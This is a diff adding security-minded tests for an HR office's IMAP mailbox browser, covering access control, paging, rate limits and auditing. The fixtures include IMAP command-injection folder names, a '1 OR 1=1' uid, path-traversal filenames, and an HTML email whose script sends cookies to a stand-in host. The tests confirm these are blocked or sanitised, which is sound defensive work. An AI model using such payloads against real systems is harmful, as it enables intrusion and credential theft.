@@ -14,7 +14,7 @@ const K = (o: Partial<KlientRow>): KlientRow => ({ nazwa: "", nip: "", adres: ""
 const KLIENCI = [K({ nazwa: "Alfa Sp. z o.o.", nip: "5260001246", email: "n11@firma-alfa.example, zaneta@firma-alfa.example", opiekun: "Buchok T.", kadrowy: "Kadrova H." })];
 const USERS = ["hr@td.example", "t.buchok@td.example", "szef@td.example", "rejestracja@td.example"];
 const PASS = 'haslo "z" \\ znakami';
-const WEBKEY = "w".repeat(64), CRONKEY = "c".repeat(40);
+export const WEBKEY = "w".repeat(64), CRONKEY = "c".repeat(40);
 
 const ODP = (o: Any = {}) => ({
   analiza: "Klient prosi o przygotowanie dokumentów.", kategoria: "zatrudnienie_nowy_pracownik", pilnosc: { poziom: "normalna", powod: "" }, streszczenie: "Prośba o dokumenty.",
@@ -22,10 +22,10 @@ const ODP = (o: Any = {}) => ({
   proponowane_zadanie: { tytul: "Alfa — przygotować dokumenty", opis: "Przygotować komplet.", termin: "" }, zalaczniki_uwaga: "", ...o,
 });
 
-function swiat(o: { ust?: Any; box?: FakeMsg[]; uidvalidity?: number; odp?: (req: Any) => unknown; me?: Me | null; now?: number; profil?: (s: Skrzynka, a: string) => { alias: string; domyslny: string } } = {}) {
+export function swiat(o: { ust?: Any; box?: FakeMsg[]; uidvalidity?: number; odp?: (req: Any) => unknown; me?: Me | null; now?: number; profil?: (s: Skrzynka, a: string) => { alias: string; domyslny: string } } = {}) {
   const rows: Row[] = [], tasks: Any[] = [], stan: Record<string, Any> = {};
   let ust: Any = o.ust ?? {}, seq = 0, locked = false;
-  const w = { rows, tasks, stan, asks: [] as Any[], bg: [] as Promise<unknown>[], now: o.now ?? Date.parse("2026-10-09T09:30:00Z"), servers: [] as FakeServer[], box: o.box ?? [], uidvalidity: o.uidvalidity ?? 7, me: o.me === undefined ? { email: "szef@td.example", admin: true, sekcje: null } as Me : o.me, get ust() { return ust; } };
+  const w = { rows, tasks, stan, asks: [] as Any[], log: [] as Any[], bg: [] as Promise<unknown>[], now: o.now ?? Date.parse("2026-10-09T09:30:00Z"), servers: [] as FakeServer[], box: o.box ?? [], uidvalidity: o.uidvalidity ?? 7, me: o.me === undefined ? { email: "szef@td.example", admin: true, sekcje: null } as Me : o.me, get ust() { return ust; } };
   const id = () => `00000000-0000-4000-8000-${String(++seq).padStart(12, "0")}`;
   const store: Store = {
     ustawienia: () => Promise.resolve(ust),
@@ -55,6 +55,10 @@ function swiat(o: { ust?: Any; box?: FakeMsg[]; uidvalidity?: number; odp?: (req
     lista: (sk, f) => Promise.resolve(rows.filter((r) => sk.includes(r.skrzynka) && (!f.status || r.status === f.status) && (!f.kategoria || r.kategoria === f.kategoria)).slice().reverse().slice(0, f.limit)),
     niedokonczone: (s, starsze, mlodsze) => Promise.resolve(rows.filter((r) => r.skrzynka === s && r.status === "nowa" && !r.ai_at && r.analiza_start && r.analiza_start < starsze && r.created_at > mlodsze)),
     statystyki: () => Promise.resolve({}),
+    dziennik: (r) => { w.log.push({ at: new Date(w.now).toISOString(), ...r }); return Promise.resolve(); },
+    dziennikLicz: (kto, od) => Promise.resolve(w.log.filter((r) => r.kto === kto && r.at >= od).length),
+    dziennikLista: (n) => Promise.resolve(w.log.filter((r) => ["otwarcie", "zalacznik", "analiza"].includes(r.akcja)).slice(-n).reverse()),
+    dziennikSprzataj: () => Promise.resolve(),
     usunStarsze: (c) => { const n = rows.filter((r) => r.created_at < c).length; for (let i = rows.length - 1; i >= 0; i--) if (rows[i].created_at < c) rows.splice(i, 1); return Promise.resolve(n); },
   };
   const d: Deps = {
@@ -377,6 +381,7 @@ Deno.test("self-checks: autotest masks, validates and leaves no row and no task;
   const k = dg.body.diag.kadry;
   assertEquals([k.login, k.wiadomosci, k.najwyzszy_uid, k.nieprzeczytane_przed, k.nieprzeczytane_po, k.pobrane_naglowki, k.bez_zmian], [true, 2, 2, 2, 2, 2, true]);
   assert(!/firma-alfa|Sprawa|Nadawca/.test(JSON.stringify(dg.body)));
+  assertEquals(k.foldery, { liczba: 1, typy: { inbox: 1 }, policzone: 1, wiadomosci_razem: 2, separator: ".", nie_ascii: 0 });
 });
 
 Deno.test("settings wylaczona -> podglad: saved in one step, the mailbox starts from now; a failing write changes nothing and says so", async () => {
@@ -416,4 +421,192 @@ Deno.test("database answers without a body (201/204 after return=minimal) are an
   assertEquals(await wiersze(new Response("", { status: 200 })), []);
   assertEquals(await wiersze(new Response('[{"a":1}]', { status: 200 })), [{ a: 1 }]);
   assertEquals(await wiersze(new Response('{"a":1}', { status: 200 })), [{ a: 1 }]);
+});
+
+// ================================================================ mailbox browser
+import { MAX_ZALACZNIK, NA_MINUTE } from "./skrzynka.ts";
+import type { Folder, Meta, Node } from "./imap.ts";
+const te = new TextEncoder();
+type BMsg = { uid: number; flagi: string[]; head: string; bs: Node; parts: Record<string, Uint8Array>; raw?: string; size?: number };
+// what a server would hold: folders (raw names as LIST gives them) with messages; every call is recorded
+function skrzynkaStub(folders: Record<string, BMsg[]>, extra: Folder[] = []) {
+  const calls: string[] = [];
+  let cur = "";
+  const head = (m: BMsg) => te.encode(m.head.replace(/\r?\n/g, "\r\n") + "\r\n\r\n");
+  const meta = (m: BMsg, h: boolean): Meta => ({ uid: m.uid, flagi: m.flagi, size: m.size ?? 1000, internaldate: "09-Oct-2026 10:00:00 +0200", bs: m.bs, sekcje: h ? { "BODY[HEADER.FIELDS (FROM TO CC REPLY-TO SUBJECT DATE MESSAGE-ID)]": head(m) } : {} });
+  const box = () => (folders[cur] ?? []).slice().sort((a, b) => a.uid - b.uid);
+  const im = {
+    calls, closed: 0,
+    list: () => { calls.push("LIST"); return Promise.resolve([...Object.keys(folders).map((raw) => ({ raw, nazwa: raw.replace("&AUE-", "ł"), delim: ".", flagi: raw === "INBOX.Sent" ? ["\\Sent"] : [] })), ...extra]); },
+    status: (b = "INBOX") => { calls.push("STATUS " + b); const l = folders[b] ?? []; return Promise.resolve({ messages: l.length, unseen: l.filter((m) => !m.flagi.includes("\\Seen")).length, uidnext: 1, uidvalidity: 7 }); },
+    examine: (b = "INBOX") => { calls.push("EXAMINE " + b); cur = b; return Promise.resolve({ exists: (folders[b] ?? []).length, uidvalidity: 7, uidnext: 999 }); },
+    szukaj: (f: Any) => { calls.push("SEARCH " + JSON.stringify(f)); return Promise.resolve(box().filter((m) => (!f.nieprzeczytane || !m.flagi.includes("\\Seen")) && (!f.tekst || m.head.toLowerCase().includes(f.tekst.toLowerCase()))).map((m) => m.uid)); },
+    meta: (set: Any, uidMode: boolean, h: boolean) => { calls.push("META"); const l = box(); return Promise.resolve((Array.isArray(set) ? l.filter((m) => set.includes(m.uid)) : uidMode ? [] : l.slice(set.od - 1, set.do)).map((m) => meta(m, h))); },
+    part: (uid: number, id: string, max?: number) => { calls.push(`PART ${uid} ${id}`); const b = box().find((m) => m.uid === uid)?.parts[id] ?? null; return Promise.resolve(b && max ? b.slice(0, max) : b); },
+    fetch: (uid: number) => { calls.push("FETCH " + uid); const m = box().find((x) => x.uid === uid); return Promise.resolve(m ? { uid, size: 1000, internaldate: "", body: te.encode(m.raw ?? m.head.replace(/\r?\n/g, "\r\n") + "\r\n\r\nTreść wiadomości.\r\n") } : null); },
+    logout: () => { im.closed++; return Promise.resolve(); },
+    uidsAfter: () => Promise.resolve([]), uidsUnseen: () => Promise.resolve([]), uidsByMessageId: () => Promise.resolve([]), newestUids: () => Promise.resolve([]),
+  };
+  return im;
+}
+const txt = (id = "1"): Node => ["TEXT", "PLAIN", ["CHARSET", "utf-8"], null, null, "8BIT", "40", "2", null, null, null];
+const bmsg = (uid: number, o: Partial<BMsg> = {}): BMsg => ({ uid, flagi: [], head: `From: Nadawca ${uid} <n${uid}@firma-alfa.example>\nTo: kadry@td-group.pl\nSubject: Sprawa ${uid}\nDate: Fri, 09 Oct 2026 10:00:00 +0200\nMessage-ID: <b${uid}@firma-alfa.example>`, bs: txt(), parts: { "1": te.encode("Treść " + uid) }, ...o });
+const HR: Me = { email: "hr@td.example", admin: false, sekcje: ["kadry"] };
+
+Deno.test("browser: folders with counters; access by section; the mailbox only from the fixed list", async () => {
+  const { post, d, w } = swiat({ me: HR });
+  const im = skrzynkaStub({ INBOX: [bmsg(1), bmsg(2, { flagi: ["\\Seen"] })], "INBOX.Sent": [bmsg(5)], "INBOX.Za&AUE-atwione": [] }, [{ raw: "Archiwum", nazwa: "Archiwum", delim: ".", flagi: ["\\Noselect"] }]);
+  d.imap = () => Promise.resolve(im as unknown as ImapLike);
+  const f = await post({ action: "foldery", skrzynka: "kadry" });
+  assertEquals(f.body.foldery.map((x: Any) => [x.id, x.nazwa, x.typ, x.wiadomosci, x.nieprzeczytane, x.wybieralny]), [["INBOX", "INBOX", "inbox", 2, 1, true], ["Archiwum", "Archiwum", "archive", null, null, false], ["INBOX.Sent", "Sent", "sent", 1, 1, true], ["INBOX.Za&AUE-atwione", "Załatwione", "", 0, 0, true]]);
+  assertEquals(im.closed, 1); // one connection per request, always closed
+  // the other section's mailbox, an arbitrary address, a missing one
+  for (const skrzynka of ["ksiegowosc", "zarzad", "szef@td-group.pl", "", null, "INBOX"]) {
+    for (const action of ["foldery", "lista_imap", "wiadomosc_imap", "zalacznik_imap", "analizuj_imap"]) assertEquals((await post({ action, skrzynka, folder: "INBOX", uid: 1, part: "1" })).status, 403, action + " " + skrzynka);
+  }
+  assertEquals((await post({ action: "dziennik" })).status, 403);
+  w.me = { email: "rejestracja@td.example", admin: false, sekcje: ["rejestracja"] };
+  assertEquals((await post({ action: "foldery", skrzynka: "kadry" })).status, 403);
+  w.me = null;
+  assertEquals((await post({ action: "foldery", skrzynka: "kadry" })).status, 403);
+  assertEquals(im.closed, 1);
+});
+
+Deno.test("browser: a folder must be one the server listed; hostile folder names never reach a command", async () => {
+  const { post, d } = swiat({ me: HR });
+  const im = skrzynkaStub({ INBOX: [bmsg(1)] }, [{ raw: "Ukryty", nazwa: "Ukryty", delim: ".", flagi: ["\\Noselect"] }]);
+  d.imap = () => Promise.resolve(im as unknown as ImapLike);
+  for (const folder of ['INBOX" (MESSAGES)\r\nA1 DELETE "INBOX', "INBOX\r\nx LOGOUT", "inbox", "INBOX.Nie-ma", "Ukryty", "", null, 7, ["INBOX"], "x".repeat(400), "INBOX\u0000"]) {
+    for (const action of ["lista_imap", "wiadomosc_imap", "zalacznik_imap", "analizuj_imap"]) assertEquals((await post({ action, skrzynka: "kadry", folder, uid: 1, part: "1" })).status, 400, action + " " + JSON.stringify(folder));
+  }
+  assert(im.calls.every((c) => c === "LIST"), im.calls.join("|")); // nothing but LIST was ever asked
+  for (const uid of [0, -1, "1 OR 1=1", 1e12, null, "1:*"]) assertEquals((await post({ action: "wiadomosc_imap", skrzynka: "kadry", folder: "INBOX", uid })).status, 400, String(uid));
+});
+
+Deno.test("browser: list newest first with paging, search, unseen and attachment filters", async () => {
+  const pdf: Node = [txt(), ["APPLICATION", "PDF", ["NAME", "a.pdf"], null, null, "BASE64", "4000", null, ["ATTACHMENT", ["FILENAME", "a.pdf"]], null], "MIXED"];
+  const msgs = Array.from({ length: 65 }, (_, i) => bmsg(i + 1, { flagi: i % 2 ? ["\\Seen", "\\Answered"] : [], bs: i === 60 || i === 10 ? pdf : txt() }));
+  msgs[62].head = msgs[62].head.replace("Sprawa 63", "=?UTF-8?B?" + btoa(String.fromCharCode(...te.encode("Żądanie wyjaśnień"))) + "?=");
+  const { post, d, w } = swiat({ me: HR });
+  const im = skrzynkaStub({ INBOX: msgs });
+  d.imap = () => Promise.resolve(im as unknown as ImapLike);
+  const p1 = await post({ action: "lista_imap", skrzynka: "kadry", folder: "INBOX" });
+  assertEquals([p1.body.razem, p1.body.wiadomosci.length, p1.body.wiadomosci[0].uid, p1.body.wiadomosci[29].uid], [65, 30, 65, 36]);
+  const r = p1.body.wiadomosci[2];
+  assertEquals([r.uid, r.temat, r.od_adres, r.przeczytana, r.zalaczniki, r.data], [63, "Żądanie wyjaśnień", "n63@firma-alfa.example", false, false, "2026-10-09T08:00:00.000Z"]);
+  assertEquals([p1.body.wiadomosci[4].zalaczniki, p1.body.wiadomosci[1].przeczytana, p1.body.wiadomosci[1].odpowiedziano], [true, true, true]);
+  const p3 = await post({ action: "lista_imap", skrzynka: "kadry", folder: "INBOX", strona: 3 });
+  assertEquals(p3.body.wiadomosci.map((x: Any) => x.uid), [5, 4, 3, 2, 1]);
+  assertEquals((await post({ action: "lista_imap", skrzynka: "kadry", folder: "INBOX", strona: 9 })).body.wiadomosci, []);
+  const s1 = await post({ action: "lista_imap", skrzynka: "kadry", folder: "INBOX", szukaj: "  n7@firma  " });
+  assertEquals([s1.body.razem, s1.body.wiadomosci[0].uid], [1, 7]);
+  const un = await post({ action: "lista_imap", skrzynka: "kadry", folder: "INBOX", nieprzeczytane: true, strona: 2 });
+  assertEquals([un.body.razem, un.body.wiadomosci.length, un.body.wiadomosci[0].uid], [33, 3, 5]);
+  const at = await post({ action: "lista_imap", skrzynka: "kadry", folder: "INBOX", zalaczniki: true });
+  assertEquals([at.body.razem, at.body.przeszukano, at.body.wiadomosci.map((x: Any) => x.uid)], [2, 65, [61, 11]]);
+  assertEquals((await post({ action: "lista_imap", skrzynka: "kadry", folder: "INBOX", od: "2026-02-30" })).status, 400);
+  // listing is counted for the rate limit but is not an "opening"; nothing was stored, the model was not asked
+  assertEquals([w.log.filter((x) => x.akcja === "lista").length, w.log.filter((x) => x.akcja === "otwarcie").length, w.rows.length, w.asks.length], [7, 0, 0, 0]);
+  assert(im.calls.every((c) => !c.startsWith("PART") && !c.startsWith("FETCH")));
+});
+
+Deno.test("browser: opening a message — text, cleaned HTML in a CSP document, attachments listed, audit row; nothing stored, model not asked", async () => {
+  const html = '<html><head><style>p{background:url(https://sledz.example/b.gif)}</style></head><body onload="alert(1)"><p>Dzień dobry, <b>PESEL 44051401359</b></p><script>fetch("https://zly.example/"+document.cookie)</script><img src="cid:logo1"><img src="https://sledz.example/pixel.gif" width="1"><a href="javascript:alert(1)">klik</a></body></html>';
+  const bs: Node = [[["TEXT", "HTML", ["CHARSET", "utf-8"], null, null, "8BIT", String(html.length), "3", null, null, null], ["IMAGE", "PNG", ["NAME", "logo.png"], "<logo1>", null, "BASE64", "12", null, ["INLINE", ["FILENAME", "logo.png"]], null], "RELATED"],
+    ["APPLICATION", "PDF", ["NAME", "=?UTF-8?B?" + btoa(String.fromCharCode(...te.encode("umowa_zażółć.pdf"))) + "?="], null, null, "BASE64", "8", null, ["ATTACHMENT", ["FILENAME*", "UTF-8''umowa_za%C5%BC%C3%B3%C5%82%C4%87.pdf"]], null],
+    ["APPLICATION", "ZIP", ["NAME", "wielki.zip"], null, null, "BASE64", String(40 * 1024 * 1024), null, ["ATTACHMENT", ["FILENAME", "../../wielki.zip"]], null], "MIXED"];
+  const m = bmsg(9, { bs, parts: { "1.1": te.encode(html), "1.2": te.encode("iVBORw0KGgo="), "2": te.encode("JVBERi0x") } });
+  const { post, d, w } = swiat({ me: HR });
+  const im = skrzynkaStub({ INBOX: [m], "INBOX.Sent": [] });
+  d.imap = () => Promise.resolve(im as unknown as ImapLike);
+  const r = await post({ action: "wiadomosc_imap", skrzynka: "kadry", folder: "INBOX", uid: 9 });
+  assertEquals(r.status, 200);
+  const b = r.body;
+  assertEquals([b.temat, b.od_adres, b.zdalne, b.przeczytana], ["Sprawa 9", "n9@firma-alfa.example", 1, false]);
+  assert(b.tekst.includes("PESEL 44051401359")); // an authorised reader sees the mail as it is — masking is only for the model
+  assert(!/<script|onload|javascript:|fetch\(|url\(|<style/i.test(b.srcdoc.replace(/<style>html\{[^<]*<\/style>/, "")), b.srcdoc);
+  assert(b.srcdoc.includes("Content-Security-Policy") && b.srcdoc.includes("default-src 'none'") && b.srcdoc.includes('src="data:image/png;base64,iVBORw0KGgo="'));
+  assert(b.srcdoc.includes('data-zdalne="https://sledz.example/pixel.gif"') && !/ src="https?:/.test(b.srcdoc));
+  assertEquals(b.zalaczniki, [{ part: "2", nazwa: "umowa_zażółć.pdf", typ: "application/pdf", rozmiar: 5, za_duzy: false }, { part: "3", nazwa: ".._.._wielki.zip".replace(/^\.+/, ""), typ: "application/zip", rozmiar: Math.floor(40 * 1024 * 1024 * 0.74), za_duzy: true }]);
+  assertEquals(b.analiza, null);
+  assert(!im.calls.includes("PART 9 2") && !im.calls.includes("PART 9 3")); // attachments are not loaded when a message is opened
+  assertEquals(w.log.map((x) => [x.kto, x.akcja, x.skrzynka, x.folder, x.uid, /^[0-9a-f]{32}$/.test(x.msg_hash)]), [["hr@td.example", "otwarcie", "kadry", "INBOX", 9, true]]);
+  assert(!JSON.stringify(w.log).includes("Sprawa") && !JSON.stringify(w.log).includes("firma-alfa"));
+  assertEquals([w.rows.length, w.asks.length, im.closed], [0, 0, 1]);
+  assertEquals((await post({ action: "wiadomosc_imap", skrzynka: "kadry", folder: "INBOX", uid: 77 })).status, 404);
+  assertEquals((await post({ action: "wiadomosc_imap", skrzynka: "kadry", folder: "INBOX.Sent", uid: 9 })).status, 404);
+  // without the audit row there is no content
+  d.store.dziennik = () => Promise.reject(new Error("poczta_dostep: 503"));
+  const no = await post({ action: "wiadomosc_imap", skrzynka: "kadry", folder: "INBOX", uid: 9 });
+  assert(no.body.error && !no.body.tekst && !no.body.srcdoc);
+  // the admin reads the log; staff cannot
+  w.me = { email: "szef@td.example", admin: true, sekcje: null };
+  assertEquals((await post({ action: "dziennik" })).body.dziennik.length, 1);
+});
+
+Deno.test("browser: attachment download — a file, never a page; size cap; only parts that are attachments; audit", async () => {
+  const bs: Node = [txt(), ["TEXT", "HTML", ["NAME", "strona.html"], null, null, "BASE64", "40", "1", null, ["ATTACHMENT", ["FILENAME", "strona.html"]], null],
+    ["APPLICATION", "ZIP", null, null, null, "BASE64", String(Math.ceil((MAX_ZALACZNIK + 4096) / 0.74)), null, ["ATTACHMENT", ["FILENAME", "wielki.zip"]], null],
+    ["IMAGE", "SVG+XML", ["NAME", 'x".svg'], null, null, "QUOTED-PRINTABLE", "30", null, ["ATTACHMENT", null], null], "MIXED"];
+  const m = bmsg(4, { bs, parts: { "1": te.encode("Treść"), "2": te.encode(btoa("<script>alert(1)</script>")), "4": te.encode("<svg onload=3Dalert(1)>") } });
+  const { post, d, w } = swiat({ me: HR });
+  let cap: number | undefined;
+  const im = skrzynkaStub({ INBOX: [m] });
+  d.imap = (_s, max) => { cap = max; return Promise.resolve(im as unknown as ImapLike); };
+  const r = await post({ action: "zalacznik_imap", skrzynka: "kadry", folder: "INBOX", uid: 4, part: "2" });
+  assertEquals(r.status, 200);
+  assertEquals(new TextDecoder().decode(r.raw!.bytes), "<script>alert(1)</script>");
+  assertEquals([r.raw!.headers["Content-Type"], r.raw!.headers["X-Content-Type-Options"], r.raw!.headers["Content-Disposition"]], ["application/octet-stream", "nosniff", `attachment; filename="strona.html"; filename*=UTF-8''strona.html`]);
+  assert(/sandbox/.test(r.raw!.headers["Content-Security-Policy"]) && cap! > MAX_ZALACZNIK);
+  const svg = await post({ action: "zalacznik_imap", skrzynka: "kadry", folder: "INBOX", uid: 4, part: "4" });
+  assertEquals([svg.raw!.headers["Content-Type"], svg.raw!.headers["Content-Disposition"].includes('filename="x_.svg"'), new TextDecoder().decode(svg.raw!.bytes)], ["application/octet-stream", true, "<svg onload=alert(1)>"]);
+  // the body part is not an attachment; unknown parts and odd ids do not exist; the big one is refused before it is read
+  for (const part of ["1", "9", "2.1", "1]<0.1> BODY[", "", null, "HEADER"]) assertEquals((await post({ action: "zalacznik_imap", skrzynka: "kadry", folder: "INBOX", uid: 4, part })).status, 404, String(part));
+  const big = await post({ action: "zalacznik_imap", skrzynka: "kadry", folder: "INBOX", uid: 4, part: "3" });
+  assertEquals([big.status, !!big.raw, im.calls.includes("PART 4 3")], [413, false, false]);
+  assertEquals(w.log.map((x) => [x.akcja, x.uid, x.czesc, x.rozmiar]), [["zalacznik", 4, "2", 25], ["zalacznik", 4, "4", 21]]);
+});
+
+Deno.test("browser: a person's request rate is limited; over the limit nothing touches the mailbox", async () => {
+  const { post, d, w } = swiat({ me: HR });
+  const im = skrzynkaStub({ INBOX: [bmsg(1)] });
+  d.imap = () => Promise.resolve(im as unknown as ImapLike);
+  for (let i = 0; i < NA_MINUTE; i++) assertEquals((await post({ action: i % 2 ? "lista_imap" : "wiadomosc_imap", skrzynka: "kadry", folder: "INBOX", uid: 1 })).status, 200);
+  const n = im.calls.length;
+  for (const action of ["foldery", "lista_imap", "wiadomosc_imap", "zalacznik_imap", "analizuj_imap"]) assertEquals((await post({ action, skrzynka: "kadry", folder: "INBOX", uid: 1, part: "1" })).status, 429, action);
+  assertEquals(im.calls.length, n);
+  // another person is not affected; a minute later it works again
+  w.me = { email: "szef@td.example", admin: true, sekcje: null };
+  assertEquals((await post({ action: "lista_imap", skrzynka: "kadry", folder: "INBOX" })).status, 200);
+  w.me = HR; w.now += 61000;
+  assertEquals((await post({ action: "lista_imap", skrzynka: "kadry", folder: "INBOX" })).status, 200);
+});
+
+Deno.test("browser: 'Utwórz zadanie z tej wiadomości' runs the normal analysis once, as a proposal — also for old mail, the office's own mail and other folders", async () => {
+  const own = bmsg(3, { head: "From: Kadry <kadry@td-group.pl>\nTo: zaneta@firma-alfa.example\nSubject: Re: dokumenty\nMessage-ID: <own3@td-group.pl>\nAuto-Submitted: auto-replied" });
+  const { post, d, w } = swiat({ me: HR, ust: { skrzynki: { kadry: { tryb: "auto" } }, mapa: { "Kadrova H.": "hr@td.example" } } });
+  const im = skrzynkaStub({ INBOX: [bmsg(11)], "INBOX.Sent": [own] });
+  d.imap = () => Promise.resolve(im as unknown as ImapLike);
+  const open = await post({ action: "wiadomosc_imap", skrzynka: "kadry", folder: "INBOX", uid: 11 });
+  assertEquals([open.body.analiza, w.asks.length], [null, 0]); // looking at a message never asks the model
+  const a = await post({ action: "analizuj_imap", skrzynka: "kadry", folder: "INBOX", uid: 11 });
+  assertEquals([a.body.ok, a.body.status, w.asks.length, w.rows.length, w.tasks.length], [true, "nowa", 1, 1, 0]); // auto mode, known client — still only a proposal
+  const row = w.rows[0];
+  assertEquals([row.droga, row.uid, row.klient_nazwa, row.assignee, a.body.wiersz], ["reczna", 11, "Alfa Sp. z o.o.", "hr@td.example", row.id]);
+  // again: the existing row is returned, the model is not asked twice
+  const again = await post({ action: "analizuj_imap", skrzynka: "kadry", folder: "INBOX", uid: 11 });
+  assertEquals([again.body.bylo, again.body.wiersz, w.asks.length], [true, row.id, 1]);
+  const seen = await post({ action: "wiadomosc_imap", skrzynka: "kadry", folder: "INBOX", uid: 11 });
+  assertEquals([seen.body.analiza.id, seen.body.analiza.opisana, seen.body.analiza.zadanie], [row.id, true, null]);
+  // a message of the office itself in "Sent": analysed because a person asked; the UID of another folder is not kept
+  const s = await post({ action: "analizuj_imap", skrzynka: "kadry", folder: "INBOX.Sent", uid: 3 });
+  assertEquals([s.body.ok, w.asks.length, w.rows[1].uid, w.rows[1].status], [true, 2, null, "nowa"]);
+  assertEquals(w.log.filter((x) => x.akcja === "analiza").map((x) => [x.folder, x.uid]), [["INBOX", 11], ["INBOX.Sent", 3]]);
+  // the daily cap holds here too
+  const c = swiat({ me: HR, ust: { skrzynki: { kadry: { tryb: "podglad" } }, limity: { dziennie: 1 } } });
+  c.d.imap = () => Promise.resolve(skrzynkaStub({ INBOX: [bmsg(1), bmsg(2)] }) as unknown as ImapLike);
+  await c.post({ action: "analizuj_imap", skrzynka: "kadry", folder: "INBOX", uid: 1 });
+  const lim = await c.post({ action: "analizuj_imap", skrzynka: "kadry", folder: "INBOX", uid: 2 });
+  assert(/limit analiz/.test(lim.body.error));
+  assertEquals(c.w.asks.length, 1);
 });
